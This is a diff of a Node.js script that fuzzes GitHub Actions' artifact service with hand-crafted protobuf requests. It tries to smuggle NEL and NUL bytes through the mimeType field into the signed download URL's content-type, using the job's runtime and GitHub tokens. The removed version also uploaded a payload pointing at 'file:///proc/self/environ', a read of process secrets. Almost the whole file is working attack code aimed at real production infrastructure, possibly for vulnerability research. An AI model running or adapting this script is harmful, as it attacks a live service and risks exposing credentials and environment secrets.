@@ -6,11 +6,9 @@ import {CreateArtifactResponse} from '../node_modules/@actions/artifact/lib/gene
 import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
 
 const ids = getBackendIdsFromToken();
-const client = internalArtifactTwirpClient({maxAttempts: 1});
-const weird = 'application/json\u0085';
-const safe = 'application/json';
 const runId = process.env.GITHUB_RUN_ID;
 const repo = process.env.GITHUB_REPOSITORY;
+const token = process.env.GITHUB_TOKEN;
 
 function varint(value) {
   const bytes = [];
@@ -31,122 +29,163 @@ function stringValue(value) {
   return field(1, Buffer.from(value));
 }
 
-const name = `repo-cassette-${runId}.json`;
+const NEL_MIME = '\u0085application/json';
+const CLEAN = 'application/json';
 
-console.log('Building protobuf with duplicate mimeType fields...');
-console.log(`Name: ${name}`);
-console.log(`NEL MIME hex: ${Buffer.from(weird).toString('hex')}`);
-
-const requestBody = Buffer.concat([
-  field(1, ids.workflowRunBackendId),
-  field(2, ids.workflowJobRunBackendId),
-  field(3, name),
-  Buffer.from([0x28, 0x07]),
-  field(6, stringValue(weird)),
-  field(6, stringValue(safe)),
-]);
-
-console.log(`Request body hex: ${requestBody.toString('hex')}`);
-console.log(`Request body size: ${requestBody.length}`);
+const tests = [
+  {
+    label: 'v7-single-nel-proto',
+    desc: 'v7 with NEL mimeType, single field, protobuf binary',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-nel-proto-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, stringValue(NEL_MIME)),
+    ]),
+  },
+  {
+    label: 'v7-trailing-nel-proto',
+    desc: 'v7 with trailing NEL mimeType, single field, protobuf binary',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-trail-nel-proto-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, stringValue('application/json\u0085')),
+    ]),
+  },
+  {
+    label: 'v7-nul-nel-proto',
+    desc: 'v7 with NUL+NEL mimeType via protobuf',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-nul-nel-proto-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, stringValue('application/json\0\u0085')),
+    ]),
+  },
+  {
+    label: 'v7-dup-nel-first',
+    desc: 'v7 with duplicate: NEL first, clean second',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-dup-nel-first-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, stringValue(NEL_MIME)),
+      field(6, stringValue(CLEAN)),
+    ]),
+  },
+  {
+    label: 'v7-dup-nel-second',
+    desc: 'v7 with duplicate: clean first, NEL second',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-dup-nel-second-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, stringValue(CLEAN)),
+      field(6, stringValue(NEL_MIME)),
+    ]),
+  },
+  {
+    label: 'v7-raw-string-no-wrapper',
+    desc: 'v7 with mimeType as raw string (no StringValue wrapper)',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-raw-str-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, Buffer.from(NEL_MIME)),
+    ]),
+  },
+  {
+    label: 'v7-dup-raw-then-wrapped',
+    desc: 'v7 with first raw NEL (no wrapper), then wrapped clean',
+    body: Buffer.concat([
+      field(1, ids.workflowRunBackendId),
+      field(2, ids.workflowJobRunBackendId),
+      field(3, `test-v7-raw-then-wrap-${runId}`),
+      Buffer.from([0x28, 0x07]),
+      field(6, Buffer.from(NEL_MIME)),
+      field(6, stringValue(CLEAN)),
+    ]),
+  },
+];
 
 const createUrl = new URL(
   '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
   process.env.ACTIONS_RESULTS_URL,
 );
 
-console.log('Sending CreateArtifact with duplicate mimeType...');
-const createdResponse = await fetch(createUrl, {
-  method: 'POST',
-  headers: {
-    authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
-    'content-type': 'application/protobuf',
-  },
-  body: requestBody,
-});
-const createdBytes = new Uint8Array(await createdResponse.arrayBuffer());
-if (!createdResponse.ok) {
-  console.log(`CreateArtifact HTTP ${createdResponse.status}`);
-  console.log(`Response: ${Buffer.from(createdBytes).toString('utf8').slice(0, 300)}`);
-  throw new Error(`CreateArtifact failed: HTTP ${createdResponse.status}`);
-}
-
-const created = CreateArtifactResponse.fromBinary(createdBytes);
-if (!created.ok || !created.signedUploadUrl) {
-  throw new Error('CreateArtifact returned no upload URL');
-}
-console.log('CreateArtifact OK! Upload URL obtained.');
-
-const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
+const client = internalArtifactTwirpClient({maxAttempts: 1});
 const placeholder = Buffer.from('{}');
-await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: weird}});
-const digest = createHash('sha256').update(placeholder).digest('hex');
+const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
 
-console.log('Blob uploaded. Finalizing...');
-const finalized = await client.FinalizeArtifact({
-  workflowRunBackendId: ids.workflowRunBackendId,
-  workflowJobRunBackendId: ids.workflowJobRunBackendId,
-  name,
-  size: String(placeholder.length),
-  hash: StringValue.create({value: `sha256:${digest}`}),
-});
-if (!finalized.ok || !finalized.artifactId) {
-  throw new Error('FinalizeArtifact failed');
-}
+for (const test of tests) {
+  console.log(`\n=== ${test.label}: ${test.desc} ===`);
+  console.log(`Body hex: ${test.body.toString('hex')}`);
+  try {
+    const resp = await fetch(createUrl, {
+      method: 'POST',
+      headers: {
+        authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
+        'content-type': 'application/protobuf',
+      },
+      body: test.body,
+    });
+    const bytes = new Uint8Array(await resp.arrayBuffer());
+    if (!resp.ok) {
+      console.log(`REJECTED: HTTP ${resp.status} - ${Buffer.from(bytes).toString('utf8').slice(0, 200)}`);
+      continue;
+    }
+    const created = CreateArtifactResponse.fromBinary(bytes);
+    if (!created.ok || !created.signedUploadUrl) {
+      console.log('FAIL: no upload URL');
+      continue;
+    }
+    console.log('CREATE OK');
 
-const artifactId = String(finalized.artifactId);
-console.log(`Artifact finalized: ID ${artifactId}`);
+    const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
+    await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: CLEAN}});
 
-const repository = `${repo}/actions/artifacts/${artifactId}/zip`;
-const payload = Buffer.from(JSON.stringify({
-  full_name: repository,
-  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-  description: 'Proto duplicate MIME carrier',
-  stargazers_count: 0,
-}));
-console.log('Uploading real payload...');
-await blob.uploadData(payload, {blobHTTPHeaders: {blobContentType: weird}});
-console.log(`Payload SHA256: ${createHash('sha256').update(payload).digest('hex')}`);
+    const finalized = await client.FinalizeArtifact({
+      workflowRunBackendId: ids.workflowRunBackendId,
+      workflowJobRunBackendId: ids.workflowJobRunBackendId,
+      name: test.body.toString().match(/test-[a-z0-9-]+-\d+/)?.[0] || `unknown-${Date.now()}`,
+      size: String(placeholder.length),
+      hash: StringValue.create({value: hash}),
+    });
+    if (!finalized.ok) {
+      console.log('FINALIZE FAIL');
+      continue;
+    }
+    const id = String(finalized.artifactId);
+    console.log(`FINALIZED: ID ${id}`);
 
-console.log('Verifying artifact download...');
-const endpoint = `https://api.github.com/repos/${repository}`;
-const first = await fetch(endpoint, {
-  redirect: 'manual',
-  headers: {
-    accept: 'application/vnd.github.v3+json',
-    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
-    'user-agent': 'repo-cassette-proto-audit',
-  },
-});
-const location = first.headers.get('location');
-if (!location) {
-  throw new Error(`REST route HTTP ${first.status}, no redirect`);
-}
-const target = new URL(location);
-const rsct = target.searchParams.get('rsct') || 'absent';
-const rsctHex = Buffer.from(rsct, 'utf8').toString('hex');
-
-const downloaded = await fetch(location, {headers: {'user-agent': 'repo-cassette-proto-audit'}});
-const body = Buffer.from(await downloaded.arrayBuffer());
-const ct = downloaded.headers.get('content-type') || '';
-const ctHex = Buffer.from(ct, 'latin1').toString('hex');
-
-const report = {
-  artifactId,
-  repository,
-  name,
-  rsct,
-  rsctHex,
-  contentType: ct,
-  contentTypeHex: ctHex,
-  hasNEL: rsct.includes('\u0085') || ct.includes('\u0085'),
-  bodyMatches: body.equals(payload),
-  payloadSha256: createHash('sha256').update(payload).digest('hex'),
-  bodySha256: createHash('sha256').update(body).digest('hex'),
-};
-console.log(`REPORT ${JSON.stringify(report)}`);
-
-if (report.hasNEL) {
-  console.log('SUCCESS! NEL byte present in Content-Type!');
-} else {
-  console.log(`FAIL: rsct=${rsct} ct=${ct}`);
+    const endpoint = `https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`;
+    const check = await fetch(endpoint, {
+      redirect: 'manual',
+      headers: {
+        accept: 'application/vnd.github.v3+json',
+        authorization: `Bearer ${token}`,
+        'user-agent': 'proto-single-test',
+      },
+    });
+    const location = check.headers.get('location');
+    if (location) {
+      const url = new URL(location);
+      const rsct = url.searchParams.get('rsct') || 'absent';
+      const rsctHex = Buffer.from(rsct, 'utf8').toString('hex');
+      const hasNEL = rsct.includes('\u0085');
+      console.log(`RSCT: ${rsct} (hex: ${rsctHex}) NEL: ${hasNEL}`);
+      if (hasNEL) console.log('!!! WINNER !!!');
+    } else {
+      console.log(`NO REDIRECT: HTTP ${check.status}`);
+    }
+  } catch (err) {
+    console.log(`ERROR: ${String(err).slice(0, 200)}`);
+  }
 }
